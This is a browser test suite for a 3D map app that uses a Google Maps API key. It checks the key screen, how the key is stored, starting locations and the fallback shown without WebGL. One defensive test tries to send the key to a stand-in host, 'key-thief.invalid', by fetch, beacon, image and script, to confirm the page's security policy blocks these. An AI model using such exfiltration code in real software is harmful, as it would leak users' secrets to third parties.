// Checks everything that works without a real Google API key: the key screen and how the key is
// kept, where you begin, links, and what a browser that cannot draw the world is told.
//
//   npm test
//
// It serves the app itself, as the public demo is, with no key built in, and types a made-up
// key where one is needed (Google turns it down, which is checked too). No .env.local, no
// billing; it does need the network, for Google's refusal. It runs on GitHub with each push.
// CHROME sets which browser is used; SOFTWARE=1 draws without a graphics chip.
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createLogger, createServer } from 'vite';
import { PORTRAIT, check, finish, launch, sleep } from './lib.mjs';

const ROOT = new URL( '..', import.meta.url ).pathname;
const KEY_STORE = 'google-maps-api-key';
const LAST_STORE = 'walk-and-fly-last';
const DUMMY = 'TESTKEY_not_a_real_key_0123456789'; // shaped like a key; Google refuses it
const IPHONE_CHROME = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.0.0 Mobile/15E148 Safari/604.1';
const MAC_SAFARI = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15';

// --- the app, as the demo serves it: no key built in --------------------------------
// an empty folder for Vite's settings, so a key in .env.local (or the shell) is not picked up
const noEnv = await mkdtemp( join( tmpdir(), 'walk-and-fly-' ) );
delete process.env.VITE_GOOGLE_MAPS_API_KEY;
// the browser's console comes back through Vite; Google refusing the made-up key, and the
// policy stopping the pretend thief, are expected there
const logger = createLogger( 'warn' );
const fromPage = message => message.includes( '[console.' );
const quiet = {
	...logger,
	error: ( message, options ) => fromPage( message ) ? undefined : logger.error( message, options ),
	warn: ( message, options ) => fromPage( message ) ? undefined : logger.warn( message, options ),
};
const server = await createServer( { root: ROOT, envDir: noEnv, customLogger: quiet, server: { host: '127.0.0.1', port: 5198 } } );
await server.listen();
const BASE = server.resolvedUrls.local[ 0 ];
const ORIGIN = new URL( BASE ).origin;

// one pixel per point: these checks need no sharp picture, and drawing without a chip is slow
const PHONE = { ...PORTRAIT, deviceScaleFactor: 1 };
const SLOW = process.env.SOFTWARE ? 3 : 1;
const browser = await launch( PHONE );
const errors = [];
// Every request any page makes, so that the key can be shown to reach only Google, and the
// policy to block nothing the app needs
const GOOGLE = [ 'tile.googleapis.com', 'maps.googleapis.com', 'maps.gstatic.com' ];
const sent = new Map(); // request → whether it carried the key; ones the policy stops never leave the browser
const watch = page => {

	page.on( 'pageerror', e => errors.push( e.message ) );
	page.on( 'request', r => {

		const url = new URL( r.url() );
		if ( ! url.protocol.startsWith( 'http' ) || url.origin === ORIGIN ) return;
		sent.set( r, [ r.url(), r.postData() ?? '', JSON.stringify( r.headers() ) ].some( part => part.includes( DUMMY ) ) );

	} );
	page.on( 'requestfailed', r => { if ( /^csp$|BLOCKED_BY_CSP/.test( r.failure()?.errorText ?? '' ) ) sent.delete( r ); } );
	page.evaluateOnNewDocument( () => {

		document.addEventListener( 'securitypolicyviolation', e => console.warn( `blocked: ${ e.violatedDirective } ${ e.blockedURI.split( '?' )[ 0 ] }` ) );

	} );
	page.on( 'console', m => { if ( m.text().startsWith( 'blocked: ' ) && ! m.text().includes( 'key-thief.invalid' ) ) errors.push( m.text() ); } );
	return page;

};

/** A fresh browser profile: nothing stored, and location allowed only when given one. */
const profile = async geo => {

	const ctx = await browser.createBrowserContext();
	if ( geo ) await ctx.overridePermissions( ORIGIN, [ 'geolocation' ] );
	return {
		ctx,
		/** A new tab, as a fresh visit: sessionStorage starts empty. `seed` runs before the app, on its first load only. */
		open: async ( url = BASE, { seed, before } = {} ) => {

			const page = watch( await ctx.newPage() );
			page.setDefaultTimeout( 30000 * SLOW );
			if ( geo ) await page.setGeolocation( geo );
			if ( before ) await before( page );
			if ( seed ) {

				await page.evaluateOnNewDocument( ( code, args ) => {

					try {

						if ( sessionStorage.getItem( 'seeded' ) ) return;
						sessionStorage.setItem( 'seeded', '1' );
						new Function( 'args', code )( args );

					} catch { /* about:blank has no storage */ }

				}, seed.code, seed.args );

			}

			await page.goto( url, { waitUntil: 'domcontentloaded' } );
			return page;

		},
	};

};
const withKey = ( more = '' ) => ( { code: `localStorage.setItem( '${ KEY_STORE }', '${ DUMMY }' ); ${ more }`, args: null } );
const asksForKey = page => page.waitForSelector( '.setup form', { timeout: 10000 * SLOW } ).then( () => true, () => false );
const started = page => page.waitForFunction( () => window.player, { timeout: 20000 * SLOW } ).then( () => true, () => false );
const startsWithoutAsking = async page => await started( page ) && await page.$( '.setup form' ) === null;
const stored = page => page.evaluate( k => ( { local: localStorage.getItem( k ), session: sessionStorage.getItem( k ) } ), KEY_STORE );
/** Where you are, once you are near the expected spot (or after `wait` ms). */
const near = async ( page, lat, lng, wait = 20000 * SLOW ) => {

	await page.waitForFunction( ( lat, lng ) => {

		if ( ! window.player ) return false;
		const at = world.toLatLng( player.position );
		return Math.abs( at.lat - lat ) < 1e-3 && Math.abs( at.lng - lng ) < 1e-3;

	}, { timeout: wait }, lat, lng ).catch( () => {} );
	// with a made-up key no ground ever loads, so you are still arriving: the mode you will land in is the one to look at
	return page.evaluate( () => window.player ? { ...world.toLatLng( player.position ), mode: player.resume?.mode ?? player.mode, heading: Math.round( player.heading ) } : null );

};
const isAt = ( at, lat, lng ) => !! at && Math.abs( at.lat - lat ) < 1e-3 && Math.abs( at.lng - lng ) < 1e-3;
const round = at => at && { lat: + at.lat.toFixed( 4 ), lng: + at.lng.toFixed( 4 ), mode: at.mode, heading: at.heading };

// --- the key screen fits every screen --------------------------------------------------
{

	const { ctx, open } = await profile();
	const page = await open();
	check( 'a first visit asks for a key', await asksForKey( page ) );
	const origin = await page.$eval( '.setup .origin', e => e.textContent );
	check( 'it names this site, to restrict the key to', origin === `${ ORIGIN }/*`, origin );

	for ( const [ width, height, mobile ] of [ [ 320, 568, true ], [ 390, 844, true ], [ 568, 320, true ], [ 844, 292, true ], [ 1280, 720, false ] ] ) {

		await page.setViewport( { width, height, ...( mobile ? { deviceScaleFactor: 1, isMobile: true, hasTouch: true, isLandscape: width > height } : {} ) } );
		await sleep( 300 );
		const fit = await page.evaluate( () => {

			const box = document.querySelector( '.setup' ), r = box.getBoundingClientRect();
			const start = box.querySelector( 'form button' ).getBoundingClientRect();
			return {
				onScreen: r.left >= 0 && r.top >= 0 && r.right <= innerWidth + 0.5 && r.bottom <= innerHeight + 0.5,
				reachable: box.scrollHeight <= box.clientHeight + 1 || getComputedStyle( box ).overflowY === 'auto',
				startInside: start.left >= r.left && start.right <= r.right + 0.5,
				noSidewaysScroll: document.documentElement.scrollWidth <= innerWidth,
				font: getComputedStyle( box.querySelector( 'form input' ) ).fontSize,
			};

		} );
		check( `the key screen fits ${ width }x${ height }`, fit.onScreen && fit.reachable && fit.startInside && fit.noSidewaysScroll && fit.font === '16px', fit );

	}

	await page.setViewport( PHONE );
	check( 'Remember the key on this device is ticked to begin with', await page.$eval( '.remember input', e => e.checked ) );
	await page.click( '.setup form button' );
	const empty = await page.$eval( '.problem', e => e.textContent );
	await page.type( '.setup form input', 'not a key' );
	await page.click( '.setup form button' );
	const junk = await page.$eval( '.problem', e => e.textContent );
	check( 'an empty box or something that is not a key is refused, saying why', empty === 'Paste your API key first.' && junk.startsWith( 'That does not look like an API key' ) && await page.$( '.setup form' ) !== null, [ empty, junk ] );
	await ctx.close();

}

// --- a key is remembered on the device, unless you say not to ---------------------
{

	const { ctx, open } = await profile();
	let page = await open();
	await asksForKey( page );
	await page.type( '.setup form input', DUMMY );
	await page.click( '.setup form button' );
	check( 'a key that looks right starts the app', await started( page ) );
	check( 'the key never reaches the address bar', ! page.url().includes( DUMMY ), page.url() );
	const kept = await stored( page );
	check( 'it is remembered on the device', kept.local === DUMMY && kept.session === null, kept );

	// Google refuses the made-up key: the page says so and offers another go
	const refusal = await page.waitForSelector( '.banner.show', { timeout: 30000 } )
		.then( n => n.evaluate( e => ( { text: e.innerText, button: e.querySelector( 'button' )?.textContent } ) ) ).catch( () => null );
	check( 'a key Google turns down is reported, with a way to enter another', !! refusal && refusal.text.includes( 'Google' ) && refusal.button === 'Enter a different key', refusal );

	await page.close();
	page = await open();
	check( 'a fresh visit does not ask again', await startsWithoutAsking( page ) );

	await Promise.all( [ page.waitForNavigation(), page.evaluate( () => document.querySelector( '.goto .forget' ).click() ) ] );
	check( 'Change API key goes back to the key screen', await asksForKey( page ) );
	const forgotten = await stored( page );
	check( '…and forgets the key', forgotten.local === null && forgotten.session === null, forgotten );

	await page.click( '.remember input' );
	await page.type( '.setup form input', DUMMY );
	await page.click( '.setup form button' );
	await started( page );
	const tabOnly = await stored( page );
	check( 'unticked, the key is kept for this tab only', tabOnly.local === null && tabOnly.session === DUMMY, tabOnly );
	await page.reload( { waitUntil: 'domcontentloaded' } );
	check( '…so a reload does not ask', await startsWithoutAsking( page ) );
	await page.close();
	page = await open();
	check( '…but a fresh visit does', await asksForKey( page ) );

	// "Enter a different key" on Google's refusal forgets it too
	await page.type( '.setup form input', DUMMY );
	await page.click( '.setup form button' );
	await started( page );
	const retry = await page.waitForSelector( '.banner.show button', { timeout: 30000 } ).catch( () => null );
	if ( retry ) await Promise.all( [ page.waitForNavigation(), retry.click() ] );
	check( 'Enter a different key goes back to the key screen and forgets it', !! retry && await asksForKey( page ) && ( await stored( page ) ).local === null );
	await ctx.close();

}

// --- opened from a home-screen icon ---------------------------------------------
{

	const { ctx, open } = await profile();
	// an iPhone's Safari says navigator.standalone when opened from the home screen
	const homeScreen = { before: page => page.evaluateOnNewDocument( () => Object.defineProperty( Navigator.prototype, 'standalone', { get: () => true } ) ) };
	let page = await open( BASE, homeScreen );
	await asksForKey( page );
	await page.type( '.setup form input', DUMMY );
	await page.click( '.setup form button' );
	await started( page );
	check( 'the home-screen app offers no Fullscreen button (it is full screen already)', await page.$( '.goto .fullscreen' ) === null );
	await page.close();
	page = await open( BASE, homeScreen );
	check( 'the home-screen app keeps the key between launches', await startsWithoutAsking( page ) );
	await ctx.close();

	const tab = await profile();
	page = await tab.open( BASE, { seed: withKey() } );
	await started( page );
	const offered = await page.evaluate( () => ( { button: !! document.querySelector( '.goto .fullscreen' ), can: document.fullscreenEnabled } ) );
	check( 'a browser tab offers Fullscreen where the browser can', offered.button === offered.can, offered );
	await tab.ctx.close();

}

// --- where you begin ---------------------------------------------------------------
const PARIS = { latitude: 48.8584, longitude: 2.2945 };
const lastVisit = ( daysAgo, extra = {} ) => withKey( `localStorage.setItem( '${ LAST_STORE }', JSON.stringify( Object.assign( { lat: 35.6586, lng: 139.7454, height: 400, mode: 'walk', heading: 90, pitch: 0, t: Date.now() - ${ daysAgo } * 864e5 }, ${ JSON.stringify( extra ) } ) ) );` );
{

	let p = await profile();
	let at = await near( await p.open( BASE, { seed: withKey() } ), 51.5055, - 0.0754 );
	check( 'with location refused and nothing else to go on, you begin at the first preset', isAt( at, 51.5055, - 0.0754 ), round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	at = await near( await p.open( BASE, { seed: withKey() } ), PARIS.latitude, PARIS.longitude );
	check( 'with location allowed, you begin where you are', isAt( at, PARIS.latitude, PARIS.longitude ), round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	at = await near( await p.open( `${ BASE }#40.74840,-73.98570`, { seed: withKey() } ), 40.7484, - 73.9857 );
	check( 'a link wins over your location', isAt( at, 40.7484, - 73.9857 ), round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	at = await near( await p.open( BASE, { seed: lastVisit( 6 ) } ), 35.6586, 139.7454 );
	check( 'a visit in the last week resumes there, on foot, facing the same way', isAt( at, 35.6586, 139.7454 ) && at.mode === 'walk' && at.heading === 90, round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	at = await near( await p.open( `${ BASE }#35.65860,139.74540`, { seed: lastVisit( 1 ) } ), 35.6586, 139.7454 );
	check( 'a link to where you left off is a reload: you resume, still on foot', isAt( at, 35.6586, 139.7454 ) && at.mode === 'walk' && at.heading === 90, round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	at = await near( await p.open( `${ BASE }#40.74840,-73.98570`, { seed: lastVisit( 1 ) } ), 40.7484, - 73.9857 );
	check( 'a link to somewhere else wins over where you left off', isAt( at, 40.7484, - 73.9857 ), round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	let page = await p.open( BASE, { seed: lastVisit( 8 ) } );
	at = await near( page, PARIS.latitude, PARIS.longitude );
	check( 'a visit more than a week ago is forgotten', isAt( at, PARIS.latitude, PARIS.longitude ) && await page.evaluate( k => localStorage.getItem( k ) === null, LAST_STORE ), round( at ) );
	await p.ctx.close();

	p = await profile( PARIS );
	page = await p.open( BASE, { seed: lastVisit( 1, { lat: 'nowhere' } ) } );
	at = await near( page, PARIS.latitude, PARIS.longitude );
	check( 'a damaged record of the last visit is ignored', isAt( at, PARIS.latitude, PARIS.longitude ), round( at ) );
	await p.ctx.close();

	p = await profile();
	page = await p.open( `${ BASE }#%`, { seed: withKey() } );
	check( 'a mangled link still starts the app', await started( page ) );
	await page.evaluate( () => { location.hash = '#48.85840,2.29450'; } );
	at = await near( page, PARIS.latitude, PARIS.longitude );
	check( 'a link pasted into the address bar while it is open is followed', isAt( at, PARIS.latitude, PARIS.longitude ), round( at ) );
	await p.ctx.close();

}

// --- the key goes to Google and nowhere else ------------------------------------------
{

	const p = await profile();
	const page = await p.open( `${ BASE }#51.50800,-0.12810`, { seed: withKey() } );
	await started( page );
	// searching by name loads Google's Maps script with the key (Google refuses the made-up one)
	await page.evaluate( () => document.querySelector( '.goto-open' )?.click() );
	await page.type( '.goto input', 'Eiffel Tower' );
	await page.keyboard.press( 'Enter' );
	const note = await page.waitForFunction( () => document.querySelector( '.note' ).textContent, { timeout: 30000 } ).then( h => h.jsonValue(), () => '' );
	check( 'searching by name reaches Google, and a refusal is explained', note.includes( 'Searching by name needs' ), note );

	// a change that tried to send the key elsewhere is stopped by the page's security policy
	const tried = await page.evaluate( async key => {

		const blocked = [];
		document.addEventListener( 'securitypolicyviolation', e => blocked.push( e.violatedDirective ) );
		const away = `https://key-thief.invalid/?k=${ key }`;
		await fetch( away ).catch( () => {} );
		navigator.sendBeacon( away, key );
		new Image().src = away;
		const s = document.createElement( 'script' );
		s.src = away;
		document.head.append( s );
		await new Promise( r => setTimeout( r, 1000 ) );
		return blocked;

	}, DUMMY );
	check( 'the page refuses to send anything to another site, by fetch, beacon, image or script', [ 'connect-src', 'img-src', 'script-src-elem' ].every( d => tried.some( t => t.startsWith( d.split( '-elem' )[ 0 ] ) ) ) && tried.length >= 4 && ! [ ...sent.keys() ].some( r => r.url().includes( 'key-thief.invalid' ) ), tried );
	await p.ctx.close();

}

// --- a page that cannot zoom ------------------------------------------------------
{

	const p = await profile();
	const page = await p.open( BASE, { seed: withKey() } );
	await started( page );
	const zoom = await page.evaluate( () => ( {
		viewport: document.querySelector( 'meta[name=viewport]' ).content,
		scene: getComputedStyle( document.getElementById( 'view' ) ).touchAction,
		panels: [ ...document.querySelectorAll( '#ui > *' ) ].map( e => getComputedStyle( e ).touchAction ),
	} ) );
	// Safari keeps a pinch-zoom across reloads, and the scene would not let you pinch back out
	check( 'nothing can pinch- or double-tap-zoom the page', zoom.viewport.includes( 'maximum-scale=1' ) && zoom.scene === 'none' && zoom.panels.every( t => t === 'pan-x pan-y' || t === 'none' ), zoom );
	await p.ctx.close();

}

// --- a browser that cannot draw it at all ------------------------------------------------
{

	const noWebGL = page => page.evaluateOnNewDocument( () => { HTMLCanvasElement.prototype.getContext = () => null; } );
	const told = async ( ua, viewport ) => {

		const p = await profile();
		const page = await p.open( BASE, { seed: withKey(), before: async page => { await noWebGL( page ); if ( ua ) await page.setUserAgent( ua ); await page.setViewport( viewport ); } } );
		const said = await page.waitForSelector( '.setup', { timeout: 15000 } ).then( n => n.evaluate( e => {

			const r = e.getBoundingClientRect();
			return { text: e.textContent, fits: r.left >= 0 && r.right <= innerWidth && r.top >= 0 && r.bottom <= innerHeight + 0.5 };

		} ) ).catch( () => ( { text: '', fits: false } ) );
		await p.ctx.close();
		return said;

	};

	let said = await told( null, { width: 1280, height: 720 } );
	check( 'a browser without WebGL gets an explanation, not a blank page', said.text.includes( 'cannot draw the 3D world' ) && ! said.text.includes( 'Lockdown' ) && said.fits, said.text.trim().slice( 0, 60 ) );
	said = await told( IPHONE_CHROME, { width: 320, height: 568, isMobile: true, hasTouch: true } );
	check( 'on an iPhone it names Lockdown Mode, how Safari excludes the site, and to use Safari', said.text.includes( 'Lockdown Mode' ) && said.text.includes( 'Website Settings' ) && said.text.includes( 'open this page in Safari' ) && said.fits, said.fits );
	said = await told( MAC_SAFARI, { width: 1280, height: 720 } );
	check( 'in Safari on a Mac it says which setting excludes this site', said.text.includes( 'Lockdown Mode' ) && said.text.includes( `Settings for ${ new URL( BASE ).hostname }` ) && said.fits, said.fits );

}

const hosts = new Set( [ ...sent.keys() ].map( r => new URL( r.url() ).host ) );
const leaks = new Set( [ ...sent ].filter( ( [ r, carried ] ) => carried && ! GOOGLE.includes( new URL( r.url() ).host ) ).map( ( [ r ] ) => new URL( r.url() ).host ) );
check( 'the key went to Google and nowhere else', leaks.size === 0 && [ ...sent.values() ].some( Boolean ), { leaks: [ ...leaks ], hosts: [ ...hosts ] } );
check( 'the only other sites contacted are Google\'s', [ ...hosts ].every( h => GOOGLE.includes( h ) ), [ ...hosts ] );
check( 'no errors on any page, and nothing the app needs was blocked', errors.length === 0, errors );

await browser.close();
await server.close();
await rm( noEnv, { recursive: true, force: true } );
finish();
